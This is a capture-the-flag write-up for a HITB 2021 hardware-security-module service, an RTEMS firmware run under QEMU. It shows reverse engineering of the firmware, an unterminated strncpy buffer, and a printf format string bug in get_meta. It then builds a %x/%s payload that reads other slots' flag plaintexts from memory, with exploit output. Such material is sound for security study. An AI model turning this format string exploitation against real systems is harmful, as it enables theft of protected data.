## HSM Service Writeup

The service is a Hardware Security Module with web interface. It 
provides us with the following features:
- register / login / logout,
- generate a key pair (gives us public key),
- set and get meta information,
- decrypt a ciphertext.

To combat brute-force and DoS, registration requires special hsm-token, signed by 
jury's private key. Teams can get new hsm-token at https://hsm-auth.ctf.hitb.org/ 
(once per 30 seconds).

The service consists of two processes, running inside one Docker container
(to start it up, just type `docker-compose up --build`).

```
user@dell ~ $ docker ps
CONTAINER ID   IMAGE        COMMAND                  CREATED        STATUS         PORTS     NAMES
b72a4ac1013f   deploy_hsm   "/bin/sh -c 'venv/bi…"   12 hours ago   Up 2 minutes             deploy_hsm_1

root@dell:/hsm# ps auxf
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
root         7  0.2  0.0 221568 29008 ?        Sl   05:47   0:00 venv/bin/python3 ./server.py --host 0.0.0.0
root        13  0.2  0.0 396412 30984 ?        Sl   05:47   0:00  \_ qemu-system-lm32 -M milkymist -kernel firmware.exe -nographic -monitor unix:qemu-monitor-socket,server,nowait

root@dell:/hsm# ls -la
total 3500
drwxr-xr-x 1 root root    4096 Nov 25 05:47 .
drwxr-xr-x 1 root root    4096 Nov 24 17:55 ..
drwxr-xr-x 2 root root    4096 Nov 24 17:55 __pycache__
-rwxrwxr-x 1 root root 3534024 Nov 23 22:34 firmware.exe
srwxr-xr-x 1 root root       0 Nov 25 05:47 qemu-monitor-socket
-rw-rw-r-- 1 root root      59 Nov 24 13:05 requirements.txt
-rwxrwxr-x 1 root root   18679 Nov 24 17:52 server.py
-rw-rw-r-- 1 root root     678 Nov 23 22:06 slot.py
drwxrwxrwt 3 root root     100 Nov 25 05:47 state
-rw-rw-r-- 1 root root    3779 Nov 24 13:03 users.py
drwxr-xr-x 1 root root    4096 Nov 24 13:07 venv

```

The first part is `server.py`, an HTTP python service that uses Sanic async framework.

The second part is `firmware.exe`, a firmware file for LatticeMico32 CPU, that is executed via Qemu.

```
user@dell ~ $ file firmware.exe 
firmware.exe: ELF 32-bit MSB executable, LatticeMico32, version 1 (SYSV), statically linked, with debug_info, not stripped
```

Format used is ELF:
```
user@dell ~ $ readelf -l firmware.exe 

Elf file type is EXEC (Executable file)
Entry point 0x40000000
There are 2 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           0x000078 0x40000000 0x40000000 0x2d9a8 0x2d9a9 RWE 0x8
  LOAD           0x02da2c 0x4002d9ac 0x4002d9ac 0x00c98 0x4c3a4 RW  0x20

 Section to Segment mapping:
  Segment Sections...
   00     .boot .init .text .fini .rodata .sbss2 
   01     .data .ctors .dtors .jcr .sbss .bss .eh_frame 
```

Running `readelf -s firmware.exe` shows us that symbols are not removed. We also can see 
`rtems_*` symbols, that gives us a hint: it is an [RTEMS](https://www.rtems.org/) 
application. RTEMS is a real-time OS, on which both application and the OS code are 
compiled in one binary. There is a single address space (no virtual memory, no address 
protection).

```
QEMU_AUDIO_DRV=none qemu-system-lm32 -M milkymist -kernel firmware.exe -nographic
```

We discover that it provides a text communication protocol:
```
hello
PROTOCOL ERROR
```

For your convenience, there is 'help' command :)
```
help
  SETSLOT <N>
  RANDINIT <SEED>
  GENERATE
  SETMETA <SLOT> <META>
  GETMETA <SLOT>
  DECRYPT <SLOT> <CIPHERTEXT_HEX>
  GETPLAINTEXT <SLOT>
```

But one command (`ENCRYPT`) is not printed... we can find it using `strings`:
```
$ strings firmware.exe | grep SETSLOT -A10
  SETSLOT <N>
  RANDINIT <SEED>
  GENERATE
  SETMETA <SLOT> <META>
  GETMETA <SLOT>
  DECRYPT <SLOT> <CIPHERTEXT_HEX>
  GETPLAINTEXT <SLOT>
SETSLOT
OK: FREE SLOT: %d
GENERATE
SETMETA
GETMETA
DECRYPT
GETPLAINTEXT
ENCRYPT
RANDINIT
RESTORE
DEFAULT SEED
```
This command will help us a lot in service usage and exploitation.

Let's do the whole cycle:
1. generate keypair
```
generate
0 = EECFA9507EC6FC7CF922CB605D43BA99E9E1380E933B022320B6654DF27A07AE78542164BBFB98FE7C7E3BB67522A4C5DA5725F902367102640B3C86DF876B5900000011
generate
1 = AF3C24A45EF9C9B94160F3C992051937BDAFB6755976007524E84BC9EE747B3F8D7CA00E09108EACF940DA8DDC955542D1E5BB29A05BF29FC9676D49BCDEF2BD00000011
generate
2 = D240FBA96F1835E2CC87453299689D11D391B07361BA2291DCBD8C2E340DD1E04873E61B4066D21275920E1EB363F3CDF2689EA259493201CDD68459A2AED2ED00000011
generate
3 = 9EF7C27DC33BF61797C260A295610A42E128C24CC56F275E7618C8313EAC2E51DA7C6F79BE7505B256C98F6460ACF13A8CD82A2BAFAE9CF02080D347EFF51EFD00000011
```
This command generates keypair (private and public keys) and prints: slot number (sequential number) and public key in HEX.

2. Encrypt plaintext (`foobar` in the following example), get ciphertext (again hex):
```
encrypt EECFA9507EC6FC7CF922CB605D43BA99E9E1380E933B022320B6654DF27A07AE78542164BBFB98FE7C7E3BB67522A4C5DA5725F902367102640B3C86DF876B5900000011 foobar
488E024D7D912CE6467248731B598455F9DFCDF9375112F4EA594D8145AC73E8016BF7B4C16935D39D3AFDADE45D57590D95FA42501C8EE34DF92AEAA3111F1F0ABF982A397977
```

3. Decrypt the ciphertext:
```
decrypt 0 488E024D7D912CE6467248731B598455F9DFCDF9375112F4EA594D8145AC73E8016BF7B4C16935D39D3AFDADE45D57590D95FA42501C8EE34DF92AEAA3111F1F0ABF982A397977
OK
```

4. Get the deciphered plaintext:
```
getplaintext 0
foobar
```

It works!

Also, there is a pair of `*meta` commands:
```
setmeta 0 xxxxxxx
OK
```
```
getmeta 0
xxxxxxx
```

What we can do before jumping into the disassembly? Let's play a little and try weird 
chars and long strings:
```
setmeta 0 !@#$%^&*()_+:"';[]{},./
PROTOCOL ERROR
```
Looks like the charset is strictly validated.

What if ...
```
setmeta 0 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
OK
getmeta 0
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXfoobar
```
WOW! We see both meta (truncated to 33 chars) and our plaintext! _We'll notice 
this only if plaintext is non-zero, i.e. we issued a `decrypt` command previously._

If we write 32 chars, output is correct (no extra otput):
```
setmeta 0 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
OK
getmeta 0
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

That means, we have 33-byte buffer for `meta` before the `plaintext` field in our slot:
```
typedef struct {
  ...
  char meta[33];
  char plaintext[...];
  ...
} Slot;  
```
If input length is 32, terminating 0 is written correctly. If it is 33, no 0-char is written.
Such behavior has the `strncpy()` C function:
```
       char *strncpy(char *dest, const char *src, size_t n);
...
       If the length of src is less than  n,  strncpy()  writes  additional  null
       bytes to dest to ensure that a total of n bytes are written.
```

Let's try weird chars in plaintext:
```
encrypt EECFA9507EC6FC7CF922CB605D43BA99E9E1380E933B022320B6654DF27A07AE78542164BBFB98FE7C7E3BB67522A4C5DA5725F902367102640B3C86DF876B5900000011 !@#$%^&*()_+:"';[]{},./
E57ACF864F894447B016461AD3FA7066C1A84B7568079520D39A09139FCE217C2F896E4DC7A246FDD86CC043FCBE816B06BB1B7BAD4DC1614211AABF6F2CB2AE2E18460B49DE74861857DE20D0991B1F54051E5240AE7DAC
```
```
decrypt 0 E57ACF864F894447B016461AD3FA7066C1A84B7568079520D39A09139FCE217C2F896E4DC7A246FDD86CC043FCBE816B06BB1B7BAD4DC1614211AABF6F2CB2AE2E18460B49DE74861857DE20D0991B1F54051E5240AE7DAC
OK
```
```
getplaintext 0
!@#$%^&*()_+:"';[]{},./
```
Looks well... but if we get the plaintext via `getmeta` (remember, `setmeta` argument was validated for charset)?

```
setmeta 0 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
OK
```
```
getmeta 0
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!@#$^&*()_+:"';[]{},./
```
Hm... `%` has disappeared!?

```
encrypt EECFA9507EC6FC7CF922CB605D43BA99E9E1380E933B022320B6654DF27A07AE78542164BBFB98FE7C7E3BB67522A4C5DA5725F902367102640B3C86DF876B5900000011 %p.%d.%s    
055A289B1F39CBB10C0503F9EC5A852840031B64B6BD960C0B0ECF829B097139B00045DFB4F50FEA0D2B26471F1B975FA23F49AE224119D26141456EDDAAEF0E31F03FE30664FA6960
```
```
decrypt 0 055A289B1F39CBB10C0503F9EC5A852840031B64B6BD960C0B0ECF829B097139B00045DFB4F50FEA0D2B26471F1B975FA23F49AE224119D26141456EDDAAEF0E31F03FE30664FA6960
OK
```
```
getmeta 0
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX0x4002f6b8.0.@��@�lGETMETA
```
Yeah! We've got a format string vulnerability here!

The radare2 disassembler confirms:
```
$ r2 -v
radare2 5.5.0 1 @ linux-x86-64 git.
commit: b50c2c35acd266f1b18bbbcfe0c63d9d0331b09d build: 2021-11-14__22:46:21

$ r2 -a lm32 firmware.exe
[0x40000000]> s sym.get_meta
[0x40006f2c]> pdb
┌ 32: sym.get_meta ();
│           0x40006f2c      379cfffc       addi sp, sp, 0xfffffffc     ; init.c:231
│           0x40006f30      5b9d0004       sw ra, sp, 0x4
│           0x40006f34      3781000c       addi r1, sp, 0xc            ; init.c:232
│           0x40006f38      f8005099       calli sym.printf  <<<<
│           0x40006f3c      34010001       mvi r1, 0x1                 ; init.c:234
│           0x40006f40      2b9d0004       lw ra, sp, 0x4
│           0x40006f44      379c0004       addi sp, sp, 0x4
│           0x40006f48      c3a00000       ret
```

It allows us to read arbitrary memory location! E.g., `plaintext` of other slots (where flags are stored
as plaintext)!

We can see `slots` symbol with its memory location in the symbols list:
```
   780: 4002f530 0x47c70 OBJECT  GLOBAL DEFAULT   12 slots
```
By the way, the same address we see in `server.py` :) 
```
SLOT_AREA_START = 0x4002f530  # Keep in sync with firmware!
```

What does `server.py` do with it?  It sends `memsave` command to qemu monitor socket:
```
cmd = "memsave 0x{:08x} {} {}\n".format(SLOT_AREA_START, SLOT_AREA_SIZE, SLOT_AREA_FILE)
```
So we can explore `SLOT_AREA_FILE = "state/slots.dump"` contents for determining the exact offset.

After decrypting encrypted `PLAINTEXT` at slot 0, and `PLAINTEXT_SLOT_1` at slot 1, we've got:
```
user@dell ~/HITB2021/final/git/proctf-2021/services/hsm/deploy/state $ hd slots.dump 
00000000  00 00 00 01 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000020  00 00 00 00 00 50 4c 41  49 4e 54 45 58 54 00 74  |.....PLAINTEXT.t|
00000030  5a 76 14 5b 0a c5 31 1a  75 f0 c1 66 06 15 9c 74  |Zv.[..1.u..f...t|
*
00000060  5a 76 14 5b 0a 00 00 00  00 00 02 00 40 02 f5 c4  |Zv.[........@...|
<SKIP>
000001a0  00 00 00 00 00 00 00 00  00 00 00 00 00 50 4c 41  |.............PLA|
000001b0  49 4e 54 45 58 54 5f 53  4c 4f 54 5f 31 00 70 f2  |INTEXT_SLOT_1.p.|
000001c0  70 dd 3a a8 48 3f e4 07  4c 02 33 80 09 e3 70 f2  |p.:.H?..L.3...p.|
*
000001e0  70 dd 3a a8 48 3f e4 07  4c 02 33 80 09 00 00 00  |p.:.H?..L.3.....|
```

So,
- `plaintext` offset inside `Slot` structure is `0x25 (decimal 37)`.
- `Slot` structure size is: `0x1ad - 0x25 = 0x188 (decimal 392)`

```
    slot0_offset = 0x4002f530
    slot_size = 392
    plaintext_offset = 4 + 33  # idx(4) + meta(33)
    read_offset = slot0_offset + slot_size * slot + plaintext_offset
```

Then we check that our input string lies on the stack (success!):
```
encrypt EECFA9507EC6FC7CF922CB605D43BA99E9E1380E933B022320B6654DF27A07AE78542164BBFB98FE7C7E3BB67522A4C5DA5725F902367102640B3C86DF876B5900000011 ABCD%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
73E01CB6DE8C1E0254F2CA7F872691B2820E58268F014489F2AD14B682CC707824BF813ECE1A4388AB0D54290E084E72DF30DF992BDDCF11E0617E5CF1C6417ED756032B1A2A97DD5D3345D12624D28AB36C65171A2A97DD5D3345D12624D28AB36C65171A2A97DD5D3345D12624D28AB36C40
```
```
decrypt 0 73E01CB6DE8C1E0254F2CA7F872691B2820E58268F014489F2AD14B682CC707824BF813ECE1A4388AB0D54290E084E72DF30DF992BDDCF11E0617E5CF1C6417ED756032B1A2A97DD5D3345D12624D28AB36C65171A2A97DD5D3345D12624D28AB36C65171A2A97DD5D3345D12624D28AB36C40
OK
```
```
getmeta 0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD4002f6b804027c88c84027c88c4002f6b81140007994004007784040077840341414141414141414141414141414141414141414141414141414141414141414141424344257825                                                                                                                                                                   A B C D % x %
```

We see, that `ABCD` was interpreted as `%x`. Then we use `%s` as format, and put `read_offset` to `ABCD` location:

```
    read_offset_bytes = read_offset.to_bytes(4, byteorder="big")
    payload = b"910" + read_offset_bytes + b"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x|%s"
```

For working exploit, see `exploit` mode of `checkers/hsm/checker.py`.
```
$ ./checker.py exploit 127.0.0.1 0
...
2021-11-25 12:00:47,234 Encrypting b'910@\x02\xf6\xdd%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x|%s'
...
2021-11-25 12:00:47,347 Sending GET 'http://127.0.0.1:9000/getmeta' ...
2021-11-25 12:00:47,361 Success, response: '122665554024031679030820336399572910@\x02��4002fb5004027c88c84027c88c4002fb5011400079940040077840400778400313232363635353534303234303331363739303330383230333336333939353732393130|PLAINTEXT_SLOT_1'.
2021-11-25 12:00:47,361 Hacked! Flag: 'PLAINTEXT_SLOT_1'
```